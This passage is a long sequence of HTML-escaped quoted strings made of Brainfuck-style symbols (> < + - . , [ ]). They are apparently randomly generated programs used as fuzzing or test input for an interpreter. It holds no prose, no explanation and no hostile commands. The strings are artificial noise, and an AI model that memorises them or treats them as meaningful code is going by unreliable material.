&quot;&gt;-&gt;&lt;-+-&lt;&gt;&lt;&gt;--+-+&gt;&lt;--&gt;&lt;-&gt;&lt;&lt;&gt;+-&gt;&lt;-&lt;&gt;--++-&lt;&gt;+-&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-++---+&lt;&gt;-+-&gt;-+-+-&gt;&lt;&gt;&lt;+--+][[-.&gt;-[]&gt;+.]&gt;&lt;[[+[+[+&quot; &quot;&lt;[..&gt;[&lt;.[&gt;&gt;++,]&gt;---]++[-&lt;.[+&lt;&gt;&lt;[,[-,+-,]&gt;[&lt;,&gt;]&lt;&lt;&gt;]+-]]][-[,[-,+-[+&gt;[&gt;,+&lt;]&lt;&gt;.[.&lt;&gt;.-]]+]&lt;.]&gt;]..]]+.+[-&quot; &quot;[+&lt;,[[..-[,+.[&gt;[&lt;]+[&gt;].]+&lt;],.[[.[,-.].[+,&gt;,]--][,[+&lt;.].&lt;[+].&lt;],&gt;],&lt;,],&gt;&gt;]+[.&lt;&gt;..,]-+,]+&gt;,&gt;]-]--&lt;]&lt;++&quot; &quot;]&lt;+--+-+-&gt;&lt;[+-&gt;&lt;&gt;&lt;&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&gt;&lt;+-+-+&lt;&gt;+-&gt;&lt;&gt;[&lt;&gt;-+-+-+-][&gt;[,[-+&lt;[-[&gt;&gt;[,&gt;+[&lt;[&lt;&lt;&lt;&lt;&lt;.]-[&gt;-[&gt;-.[.-&lt;.&gt;]]..&lt;]]&quot; &quot;-&gt;&lt;]&gt;&gt;&lt;[&gt;-[,+[,,[+[.+]++-][.,.[+&gt;&lt;&lt;-]-]+]-&lt;.]&gt;-.&gt;]+-][-]]][[.,[.-&lt;[[&gt;+&lt;+&gt;&gt;&lt;]-[[.---[-&lt;+.&gt;&gt;]][.[&gt;[.&gt;&lt;&quot; &quot;]+[-,,],]&gt;+]]]-].+,&lt;],&gt;-.]&gt;&lt;,]-&lt;-[&lt;-[[[&gt;&lt;&gt;&gt;&gt;[,&gt;&gt;&gt;&lt;.[.&lt;-++[&gt;&gt;-+,[.&gt;&lt;[]++&gt;]++]]&lt;],][+.&gt;-+]]+,[-+&gt;[,&gt;+&gt;&quot; &quot;+[,,-[-&gt;+[&gt;&gt;[+.-+&gt;[++-,.&lt;&gt;]+].,]&lt;,]&lt;]-&gt;-]&lt;++]-&gt;.]-.-]-,]&gt;&lt;&gt;&lt;][&gt;.+]&lt;&gt;&lt;&gt;,-+&lt;&gt;+-&gt;&lt;&gt;+-++--++-++-+-++&lt;&gt;-+&quot; &quot;-+-++&lt;&gt;-++&gt;&lt;-+[&lt;-&lt;&gt;-+---+&gt;&lt;-++--+-&gt;&lt;&gt;&lt;--+&gt;&lt;--+-+&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;-+-&gt;&lt;-&gt;-+&lt;&gt;-]+-+-+-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;-+&quot; &quot;&lt;&gt;&gt;&lt;--+-+&lt;&gt;-+-[-+&gt;&lt;-+-+&lt;&gt;&lt;&gt;&lt;&lt;&gt;+-+-+&gt;&lt;&lt;&gt;&lt;&gt;&gt;[+--+-&lt;&gt;&gt;&lt;-+&gt;&lt;&lt;&gt;]&lt;&gt;&lt;&gt;-+][&gt;,&lt;,&gt;.]+-,&gt;&lt;&gt;+-&gt;&lt;++-+-&gt;&lt;&lt;&gt;++-+&lt;&gt;&gt;&quot; &quot;&lt;+-++-++-+-++-[-++-&lt;-++--+-&lt;&gt;-+--+--+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-+&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;--+-&gt;&lt;-+&lt;&gt;+--&gt;&lt;&lt;&gt;+-&gt;&lt;--+-++--+&gt;&lt;--&lt;&gt;--+-+&quot; &quot;-&gt;&lt;&lt;&gt;-+-&gt;&lt;+-&lt;&gt;&lt;&gt;-+-&lt;&gt;+-+-&gt;&lt;+--&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;--++-+-&gt;&lt;]&lt;&gt;&lt;+-&lt;&gt;+-&gt;&lt;-&lt;&gt;-+[&gt;&lt;+-&gt;&lt;+-&lt;&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;[&gt;&lt;&quot; &quot;-+-&lt;&gt;]]&gt;&lt;&lt;&gt;,&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;++&gt;&lt;&gt;&lt;&lt;&gt;-++-+&gt;&lt;-++-&lt;&gt;+&lt;&gt;+&gt;&lt;-+-+&gt;&lt;[&lt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;&lt;--+-+-+&gt;&lt;-&lt;&gt;&gt;&lt;+--+--+--&gt;&lt;+-&gt;&lt;&lt;&gt;&lt;&quot; &quot;&gt;--+-+--&lt;&gt;+--&gt;&lt;&gt;&lt;+-+--+&gt;&gt;&lt;-+-+-&gt;&lt;&lt;&gt;&gt;&lt;][&lt;+[,-&gt;[&gt;&gt;..&gt;[.---&gt;[.-,[[&gt;[,[&lt;+[&gt;,&lt;+-]&gt;-[.&lt;&gt;]][&lt;+&lt;,--]&lt;+].,&gt;][&quot; &quot;&lt;,+,.[+&gt;-[,.-[.&lt;,&gt;]]],]][.&gt;+-,,+&lt;,]&lt;].+&lt;]],-&gt;].]&lt;-+-+---+&lt;&gt;-+-[&gt;&lt;-+-+&lt;&gt;&lt;&gt;&lt;-+-+-+-++&lt;&gt;&lt;&gt;-+&gt;&gt;&lt;[&lt;&gt;-+&gt;&lt;-&quot; &quot;][+&gt;-+-&lt;+]&lt;&gt;&gt;&lt;+-+--+]&lt;&gt;-+,+--+-+&lt;&gt;&gt;+-+-++&gt;&lt;+-&lt;&gt;++-&lt;&gt;+&lt;&gt;+-&gt;&lt;+&gt;&lt;&gt;&lt;+[&lt;+--+--+-+&lt;&gt;&gt;&lt;-&gt;&lt;-+&gt;&lt;-+-+-&gt;&lt;&gt;&lt;&gt;&lt;-&gt;&quot; &quot;&lt;&lt;&gt;&lt;&gt;-+--++--+--++-&lt;&gt;+--&lt;&gt;&gt;&lt;+-&lt;&gt;+--+-+--+-&lt;&gt;-+-&gt;&lt;&gt;&lt;+--&gt;&lt;&lt;&gt;-+&gt;&lt;--+--+-+-&lt;&gt;-+-&gt;&lt;&gt;&lt;-+-+--+-+&lt;&gt;-+&gt;-+&gt;&lt;-+&quot; &quot;&lt;&gt;-&lt;&gt;][&lt;+[[,+[..&lt;].,-]--,[[&lt;,-[+&lt;+[-+&lt;[.&gt;,[.-&lt;[[-,&lt;.+],.,[.-&lt;,&gt;-]]&gt;&lt;&gt;&gt;-]-+]+-,&gt;-&lt;][-[.,&lt;]&gt;.],&lt;]]&gt;-.[&quot; &quot;&gt;&gt;.[.[&lt;.+[[-&gt;&gt;[[,-]+&lt;]&gt;+[&gt;,-[,,]-&gt;,]]]-,]+-,]]].]&lt;,.]&gt;&lt;&gt;&lt;&lt;&lt;&gt;+--+--+-+-[+--+&lt;&gt;&lt;&gt;-+&lt;+-+&gt;&lt;&gt;[--++-][.&gt;+[&quot; &quot;&gt;[.+,[&gt;&lt;[-&lt;.,&lt;[+,-.]]].,-]&gt;[-&lt;&gt;-&gt;&gt;&gt;]].,+[&lt;-[,-,[&lt;.[.--[.+[[&lt;[+&gt;+[&lt;.--&gt;,-]++.+&lt;,][&lt;,[.,,&gt;]]]-]&lt;,[-&lt;-[&quot; &quot;[-+[,-+.]-[+-.&gt;&gt;,&lt;&lt;]-][&gt;&gt;&gt;+[..&gt;]-]-&lt;][[--&gt;[.,&lt;&gt;-]+][&lt;[&lt;.+.,]+&gt;.+++]..-]],,]&gt;,&gt;[++[-&lt;,-[..[+[&gt;&gt;&gt;+]-&lt;.&quot; &quot;[&lt;,-&gt;]&lt;-],,]+-]+,],-]&lt;]-&gt;,]&gt;&gt;].]-+&lt;&gt;][&lt;&lt;-+]&lt;&gt;+-+-&lt;&gt;-+,&gt;&lt;&gt;+--+&gt;&lt;&gt;&lt;&lt;&gt;+&lt;&gt;&lt;&gt;-+&lt;&gt;-++&lt;&gt;&lt;&gt;&gt;&lt;-++&gt;&lt;+&gt;&lt;&gt;&lt;+&gt;&lt;-+&quot; &quot;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&lt;[&gt;&lt;&gt;&lt;&lt;&gt;&lt;-&lt;&gt;-+&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;&gt;&lt;+--&lt;&gt;-++-&lt;&gt;&lt;&gt;--&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;--+&lt;&gt;-+&gt;&lt;-&gt;&lt;+--&lt;&gt;-++-+-&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-+--]+-+-+-&quot; &quot;&lt;+-&lt;&gt;&gt;&lt;&lt;&gt;-+[+--+&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;+&lt;&gt;&gt;&lt;&gt;+-[&gt;&lt;&lt;&gt;-++--+-][[&lt;,&gt;[-[+++[[[+.].+,[.&gt;+[-..[-[&gt;&lt;&lt;&lt;]]&lt;,[+[&lt;&lt;&lt;,--&lt;]&gt;,&gt;.&quot; &quot;]].&gt;&lt;]]&lt;[.&gt;+[&gt;[[&gt;.,[+&gt;.+&gt;.]&lt;+]+,]]+&lt;]..+].[[&lt;&lt;,.[--&gt;[-,[&gt;[.+&lt;]&gt;[+&lt;&gt;]&gt;.&lt;]&lt;&lt;,.][.+&lt;&gt;]&gt;,&lt;],-,],&gt;&lt;]&lt;&gt;].&lt;&quot; &quot;-+.].+]&lt;&lt;&gt;]][&lt;&gt;+&lt;&lt;[-&gt;[+&gt;[-&lt;.&lt;[+,+[[,+&gt;&gt;,&lt;-]]&lt;]-.].+&gt;&lt;],.+]&lt;.],-+-+&gt;&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;&lt;&gt;++-&gt;&lt;+-&gt;&lt;++--++&lt;&gt;&gt;&lt;&lt;&gt;+&quot; &quot;-+&lt;&gt;&lt;&gt;+-+-++&gt;&lt;++&gt;&lt;-+&gt;&lt;-+[&gt;&lt;&lt;-++--+-+--+-+--+&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;-+--&gt;&lt;&gt;&lt;&gt;&lt;-+-+--+&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&lt;&gt;--++-&gt;&lt;&gt;&lt;&quot; &quot;][,&lt;[,&lt;[..[+&gt;,][,[,,[-.[.+[[.&lt;],..[,[+,,]]&gt;&gt;][&gt;,[,&gt;[+,.+]&lt;-.&gt;]&gt;&lt;&gt;[-,,[&lt;-+-]&lt;[&lt;+&gt;,.-,-]&lt;&lt;]-,]].&gt;&gt;&gt;]-&gt;&quot; &quot;++]++&gt;&lt;&lt;]+,,][&gt;&lt;+.-&gt;]--+][..,]&gt;&gt;-]&gt;&lt;+--+&lt;&gt;&lt;+---[-++-&gt;&lt;-+&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-++&lt;&gt;-+&gt;&lt;&lt;&gt;&gt;-++-&lt;&gt;&gt;&lt;[-]+-&gt;&lt;+-]-+-+&gt;&quot; &quot;&lt;+-,-+&gt;&lt;-+&gt;&lt;&gt;&lt;&gt;+-+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;+&gt;&lt;&gt;&lt;&gt;&lt;+-+&gt;&lt;&lt;&gt;+&gt;&lt;++-&lt;&gt;++-+--++++-++-&lt;&gt;&gt;&lt;[&lt;&gt;+--+&lt;-+--+-&gt;&lt;+---+-+-++-&quot; &quot;+--&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;+-&gt;+--][.[[&lt;&gt;.++&gt;[&gt;.[++.&gt;][,&lt;-+[.[[&lt;&lt;&gt;[+&gt;&gt;+[.&gt;&lt;&lt;.-]&lt;&gt;&gt;][+-+--].]-&lt;&lt;],&gt;.&gt;]+].]&gt;].&lt;+]+&gt;[&quot; &quot;.---&lt;+.]]&gt;&lt;-++-&lt;&gt;&lt;&gt;&lt;-&lt;&gt;-+-+&lt;&gt;-+[-+-++-+-&lt;&gt;&lt;+&lt;&gt;-+&lt;&gt;&gt;&gt;&lt;-+[&lt;&gt;-][,[&lt;.&lt;.-&lt;]+.&lt;[&lt;+[&lt;&gt;,--][&gt;,[--+-,&gt;.]-+&lt;&lt;&gt;&quot; &quot;]-.-]+.]+--+],&gt;&lt;&gt;&lt;-++-&gt;+&lt;&gt;+-+-+&gt;&lt;+-&lt;&gt;+-+&gt;&lt;&lt;&gt;&lt;&gt;+-+-++&lt;&gt;+--++-&lt;&gt;+-+&lt;&gt;&lt;&gt;+-+-++-&lt;&gt;&lt;&gt;-+[&lt;-+--&gt;&lt;&gt;&lt;+-----&gt;&lt;&quot; &quot;&lt;&gt;+--&gt;-&gt;&lt;&gt;&lt;+-+-&gt;&lt;]-++-&lt;&gt;&lt;-+&gt;&lt;-+[+-&lt;&gt;&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;+&lt;&gt;-+&lt;&gt;-+-+&gt;[-+-][+&gt;-[&gt;&gt;&lt;[[+&gt;,.+].&lt;]]-[,-&gt;&lt;]&lt;,.]&lt;&gt;&gt;&lt;-&quot; &quot;+]+-,&gt;&lt;&lt;&gt;&lt;&gt;+--+&gt;&gt;&lt;&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;+-+-+&lt;&gt;&gt;&lt;-++&gt;&lt;&lt;&gt;+&gt;&lt;+-++&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;++--+&gt;&lt;++--+&gt;&lt;-++-+&lt;&gt;&lt;&gt;++-+-&lt;&gt;-+&gt;&lt;[&gt;&lt;&gt;&lt;+&quot; &quot;-&lt;--&gt;&lt;+-+---+-+-+-+-+-&lt;&gt;-+&gt;&lt;-&lt;&gt;&gt;&lt;-+-+-+-&gt;&lt;-&lt;&gt;-+--+--+&gt;-+&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;--+-+-+][[-&lt;-[++-[&lt;.[.&gt;,.&gt;+-]&gt;,&lt;-]-&gt;&quot; &quot;-]&gt;+,]-[&lt;.&gt;.&lt;]]&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;-+-+-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-&gt;&lt;--&gt;&lt;-+&gt;&lt;&gt;&lt;+--&gt;&lt;-+&gt;&lt;&lt;&gt;+--&lt;&gt;&gt;&lt;--+[+-&lt;&gt;&lt;+&lt;&gt;-+&gt;[&gt;&lt;-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;]&quot; &quot;[&gt;&lt;+[-,&lt;&lt;&gt;+],-]&lt;&gt;]+-&lt;&gt;-+,+--+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;+--+&gt;&lt;+-+-+++&lt;&gt;&gt;&lt;++--++-+-+&lt;&gt;+-&gt;&lt;+[&lt;&gt;&lt;--++-&lt;&gt;-&gt;&lt;-+-&lt;&gt;&gt;&lt;+-+--+-&quot; &quot;&gt;&lt;-&lt;&gt;&lt;&gt;-&lt;&gt;-+&gt;&lt;-+-+-&gt;&lt;&gt;&lt;-+-&lt;&gt;+-+-&lt;&gt;&lt;&gt;&gt;-+-+&gt;&lt;&gt;&lt;--+&lt;&gt;-+-+][.-[-[-&gt;.-+&gt;+,]+-[-&lt;&gt;]-,,]&lt;&lt;&gt;]&gt;&lt;-+-+&lt;-&lt;&gt;&lt;&gt;-++&quot; &quot;-&gt;&lt;--[&gt;&lt;&lt;&gt;-+&lt;&lt;&gt;+-&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;&lt;&gt;-+[-&lt;&gt;]]&lt;&gt;&gt;&lt;,&gt;&lt;+-+-&gt;&gt;&lt;&lt;&gt;&gt;&lt;-++-++-++-+&lt;&gt;&gt;&lt;++-&gt;&lt;+&gt;&lt;&gt;&lt;+--++[-+&lt;&gt;+--++-&quot; &quot;&lt;&lt;&gt;-++----+&gt;&lt;+--&gt;&lt;&gt;&lt;+--+-&lt;&gt;-++--+--++-&lt;&gt;-+-&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;+--&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;-][..&lt;&gt;&lt;-]-+&lt;-+-+--&gt;&lt;&lt;&gt;+-[+-+-&gt;&lt;&lt;&gt;&quot; &quot;+-&lt;-++-+-++-&gt;&lt;&gt;&lt;&gt;[+-&gt;&lt;--+&gt;&lt;][&gt;[-&lt;&gt;-][.&gt;-,--]-]&lt;&gt;+-]-++-&lt;&gt;&gt;&lt;&lt;&gt;,+-&gt;-++&lt;&gt;++-&lt;&gt;&gt;&lt;+-+&lt;&gt;+&gt;&lt;+-+&lt;&gt;+-&lt;&gt;+++-+&gt;&quot; &quot;&lt;[&lt;&gt;&lt;&gt;-+&gt;&lt;&gt;&lt;&lt;+--&lt;&gt;&gt;&lt;&lt;&gt;+---&lt;&gt;+---+--+&gt;&lt;--+&gt;&lt;-&gt;&lt;+-&gt;-++-&lt;&gt;-+&lt;&gt;-&lt;&gt;-++-&gt;&lt;&lt;&gt;][.,-[,,,--[-&lt;].,&lt;]&lt;[,+.]+-.]-&quot; &quot;+&lt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;[+--+-+&gt;&lt;+-&lt;&gt;&lt;&gt;&lt;&lt;&gt;-+-+++-&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+&gt;&lt;[+-+-+-&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;+-][&lt;-&lt;[&gt;&gt;].]-+&lt;&gt;+-]&lt;&gt;&lt;&gt;-+&lt;&gt;,&gt;&gt;&lt;+&quot; &quot;-+&gt;&lt;-++--++-+&lt;&gt;+-++-+--+&lt;&gt;++-+&gt;&lt;+-&lt;&gt;+&gt;&lt;++-&lt;&gt;+-+-&lt;&gt;+&lt;&gt;+--+&lt;&gt;&lt;&gt;[&gt;&lt;+--+-+&lt;-+&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-+--+-+&lt;&gt;-&gt;&lt;&quot; &quot;+--+-+-+-+-&lt;&gt;-&lt;&gt;-+&gt;&lt;-&gt;&lt;-&lt;&gt;-+&gt;&lt;-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-+-&lt;&gt;-+-+---+&gt;-+-++--+-&gt;&lt;-+][,[&gt;+[+,.&lt;--&lt;]&gt;[-[&lt;&lt;&gt;[-,[+.[[[&quot; &quot;.[,],[-&lt;,&gt;-]+-].-.]&lt;-[,+&gt;[.[+.+]]&gt;&lt;,]&lt;,].,+[-&gt;,]--,],[&lt;&lt;.&gt;&lt;&lt;]&gt;.-],][+.,&gt;-],&gt;]]++]&lt;&gt;&lt;--&gt;&lt;--++-&lt;&gt;[&gt;&lt;&gt;&lt;&quot; &quot;&lt;&gt;&lt;-+&gt;&lt;&lt;&gt;+-&gt;&lt;++-+-&gt;&lt;&gt;-+-++-&gt;&lt;[&lt;&gt;&lt;&gt;-+&lt;&gt;+--&lt;&gt;][.[,[[.&lt;[[+&gt;&lt;&lt;&gt;+]+.-],++,.]++].,,].[.[&lt;+-[&gt;,&gt;-++]&lt;+]&lt;]]&lt;&quot; &quot;&gt;][[&lt;....[,&lt;.[.[[.[+&gt;++[&lt;.[+-&lt;.,--]&gt;],]&gt;+&gt;-&gt;]-+[-&lt;[[+[[&gt;&gt;+-,.&lt;]&lt;]+-]+[+.[++[],&gt;],.-]+.].&lt;],]-&lt;[+[&gt;&gt;]&quot; &quot;&gt;&gt;[+&gt;[++-+&gt;]&lt;+]..]&lt;.]&lt;[&lt;[.+[.-[-[,+-,&gt;+]&lt;&gt;]].--],++].]&lt;]&gt;-[+,+&gt;.],--]&lt;&gt;,-+-+&gt;&lt;&gt;&lt;&gt;&gt;&lt;-++&lt;&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;+-+-&quot; &quot;++-+-++++-&lt;&gt;+--++-++&gt;&lt;&lt;&gt;&gt;&lt;-++&lt;&gt;+-[&gt;&lt;&lt;&gt;&gt;&lt;-+-+&lt;&lt;&gt;-+--+--+-+-&lt;&gt;&gt;&lt;&lt;&gt;--+-++--&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-&gt;&lt;--+&gt;&lt;+--&lt;&gt;-+&lt;&gt;+&quot; &quot;--&lt;&gt;-+-+--&gt;&lt;-++--+-&gt;&lt;+-&gt;--+]-++-&lt;--+&gt;&lt;&lt;&gt;--&gt;&lt;&gt;&lt;+-&gt;&lt;+--&lt;&gt;-+-&lt;&gt;+-+---+&lt;&gt;[&lt;-+&lt;&gt;+&gt;+-&gt;&lt;&lt;&gt;[--+&gt;&lt;&lt;&gt;-+]&lt;&gt;-++-&quot; &quot;]&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;,-+-++--++-&gt;&gt;&lt;-+-++-&lt;&gt;+-+-+-+&gt;&lt;-+++-+&gt;&lt;&lt;&gt;++--+&gt;&lt;+&gt;&lt;&lt;&gt;&gt;&lt;+-&lt;&gt;+&gt;&lt;-++-+[&lt;+-+--++-&lt;&gt;-+-&lt;&gt;&lt;&gt;--+&gt;&lt;&quot; &quot;--+&gt;&lt;+-+-+---+-+&lt;&gt;-+&lt;&gt;-&gt;&lt;-+&lt;&gt;-+-+-&gt;&lt;&gt;&lt;+---+&lt;&gt;-+-&gt;-++---++-+-&gt;&lt;&lt;&gt;]&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-+&lt;&gt;-+[-+-+&lt;&gt;+-&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+&quot; &quot;+--++&lt;&gt;&gt;&lt;-+&gt;&lt;&gt;+-&gt;&lt;+-&lt;&gt;[-+-+&lt;&gt;--+&gt;&lt;+-+-&gt;&lt;][&gt;,[-&gt;[+&lt;[[,&lt;[-.&gt;]]]&gt;-]-[-,&gt;&gt;[[&gt;-[,[.,&lt;-&lt;]-+]+[&lt;,[&lt;+[-&lt;]]+]&quot; &quot;+],..[+[.+&lt;[+[+--[&gt;&gt;&lt;-,-+.],.[.++]&lt;]&gt;,&lt;&lt;]-]&gt;--&lt;,]-]&gt;.]]]+-&gt;&lt;&lt;&gt;][&lt;[[.[-,,[.,&gt;[.,-&lt;&gt;-]&gt;]+.&gt;],+[+&gt;&lt;&gt;]],&quot; &quot;&lt;+]&gt;]+-&gt;&lt;&gt;&lt;,&gt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-+&lt;&gt;&lt;&gt;&gt;&lt;+-++&gt;&lt;+&lt;&gt;+-&lt;&gt;+&lt;&gt;-+-+&lt;&gt;+&gt;&lt;&lt;&gt;+&lt;&gt;-+-++-[&lt;&lt;&gt;-&lt;&gt;+--+&gt;&lt;+--&gt;&lt;&lt;&gt;-+-&lt;&gt;&gt;&lt;&lt;&gt;-+-&quot; &quot;-+-+-&gt;&lt;+-+-&lt;&gt;-&lt;&gt;-+-++--+-&gt;&lt;-+&gt;-+-+-+-&lt;&gt;+-+-][,&gt;--+,,+&lt;]&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;-+&lt;&gt;&lt;&gt;-&gt;&lt;+--+-+-+----&lt;&gt;[&lt;&lt;&gt;-+&gt;&lt;++-&quot; &quot;&gt;&gt;&lt;-+-+[&lt;&gt;&gt;&lt;&lt;&gt;-+-][+,[-&gt;-,&gt;--..][,+[&lt;[[-+]&lt;+&lt;[,[[.,,,[,[&lt;[&gt;&lt;-&lt;+]&lt;].]][..--]+]+]],[&lt;-&gt;[&lt;&lt;&lt;&gt;.&gt;],,-&lt;+,]&quot; &quot;-&lt;-]&gt;+[[+.][+[&lt;[&lt;[-+--,&lt;,][,.-&gt;&gt;]]]&lt;,-]]&lt;&gt;+]+&gt;&gt;]&lt;&gt;&lt;&gt;&gt;&lt;+-&gt;&lt;]&lt;&gt;&lt;&gt;,&lt;&gt;-+&lt;&gt;&gt;&lt;&gt;-+-+-+-++-+&gt;&lt;-+&gt;&lt;+&lt;&gt;+-+-&gt;&lt;-&quot; &quot;++&gt;&lt;&lt;&gt;+-&lt;&gt;-++-+&lt;&gt;&lt;&gt;++-&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;+-++-&lt;&gt;-++&gt;&lt;&lt;&gt;+-+-&gt;&lt;[-++-+-&gt;&lt;&lt;&lt;&gt;+-&lt;&gt;-+&gt;&lt;--+&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;-++--&gt;&lt;&lt;&gt;-+-&gt;&lt;-+&quot; &quot;+-&lt;&gt;-+--+--&gt;&lt;&gt;&lt;+--+&gt;&lt;--+&gt;&lt;&lt;&gt;&lt;&gt;+---&gt;&lt;+--&lt;&gt;&lt;&gt;&gt;&lt;-&gt;&lt;+-&gt;&lt;-+-&lt;&gt;-&gt;&lt;+-&gt;&lt;-++-&gt;&lt;&gt;-+-&lt;&gt;&lt;&gt;+-]+-&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;+--+&quot; &quot;[&lt;-+&lt;&gt;&gt;&lt;-++-+-++-&gt;&gt;&lt;[&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;+-&lt;&gt;&lt;&gt;]&gt;&lt;+-&gt;&lt;&gt;&lt;&gt;&lt;][-+&gt;+]&gt;&lt;&gt;&lt;&gt;&lt;,+-&gt;++&lt;&gt;-+&gt;&lt;++&lt;&gt;-+-++-&lt;&gt;+&gt;&lt;-+-++-+&gt;&lt;++&quot; &quot;-&gt;&lt;+-+&gt;&lt;&lt;&gt;+&gt;&lt;-+&lt;&gt;+-+&gt;&lt;+-[&gt;&lt;&lt;&gt;&lt;-+-&lt;&gt;&gt;&lt;+--+---+--+&gt;&lt;&lt;&gt;-+-+-&gt;+-&lt;&gt;-+&lt;&gt;-&lt;&gt;&gt;&lt;+-&lt;&gt;+-]&lt;&gt;&lt;&gt;-+&gt;&lt;-+&lt;&gt;&lt;-++--&lt;&gt;-+&quot; &quot;&gt;&lt;[&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-++-&gt;&lt;++-&lt;&gt;&lt;&gt;&gt;&lt;+-&gt;-+&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;[-&lt;&gt;][[+-[&lt;[&lt;[.[+.,.[-[&lt;[,-&lt;[&lt;&lt;.]&lt;+.&lt;]&lt;]+-[&gt;+,,]&gt;&gt;,]][&lt;-+&lt;&quot; &quot;,&lt;+]-]-,&gt;[..,&gt;&gt;]].,]&gt;][&lt;&lt;&lt;[.&gt;+[[-&lt;[&gt;[&gt;&lt;.[[++&lt;[.&gt;,&lt;,]]-..[[-&gt;&gt;].,,.&gt;].+]+][,,&gt;,-&lt;-]&lt;..]&gt;]-,.&gt;+].&gt;&gt;]]+&quot; &quot;]-+]&lt;&gt;+-&gt;&lt;,&gt;&lt;&gt;+&lt;&gt;-+&lt;&gt;+-&gt;&lt;+-+&lt;&gt;&gt;&lt;&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;+&lt;&gt;++-&lt;&gt;-++-++-+-+-+-++&gt;&lt;+&lt;&gt;+&gt;&lt;[&lt;&gt;+--+&lt;&gt;&lt;-&lt;&gt;&gt;&lt;-+-+-&gt;&lt;-+&quot; &quot;&gt;&lt;&gt;&lt;-+-&gt;&lt;&gt;&lt;-+&lt;&gt;-&gt;&lt;+--&gt;&lt;&gt;&lt;&gt;&lt;&gt;-++--+-][&gt;..&gt;,&lt;&gt;]+-&lt;&gt;&lt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;+---+-&gt;&lt;+-&gt;&lt;--+-&lt;&gt;-++-&gt;&lt;[-+&gt;&lt;+-&lt;++-&gt;-+&gt;&quot; &quot;&lt;[+-&gt;&lt;-+--+&gt;&lt;+-&gt;&lt;&gt;&lt;][,--[-[-[.,-]&lt;--],]]][-[&gt;.[[&gt;&lt;++,,+&lt;]+.&lt;],&gt;.]&gt;--]+-&gt;&lt;-+-+,&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-++&lt;&gt;&lt;&gt;+-&quot; &quot;+&lt;&gt;&gt;&lt;-+-++&gt;&lt;&lt;&gt;+-+-+-++-++-+&lt;&gt;++-++--++-++-&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-+[&gt;&lt;+-+-+-&gt;&lt;&lt;+-&gt;&lt;&gt;&lt;&gt;&lt;---&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;--+-&lt;&gt;+--+-+-+--&quot; &quot;-+&gt;&lt;-+--+--+-&gt;&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;-++-&gt;&lt;][&lt;&gt;[&lt;&gt;+[.[,++.]&gt;]]-,-]+-&lt;&gt;&lt;&gt;&lt;-+-[&lt;-+&lt;&gt;-+&gt;&lt;+&gt;&lt;+-+--+&gt;+-&gt;&lt;[-+&lt;&gt;-&lt;&gt;][.[+,&quot; 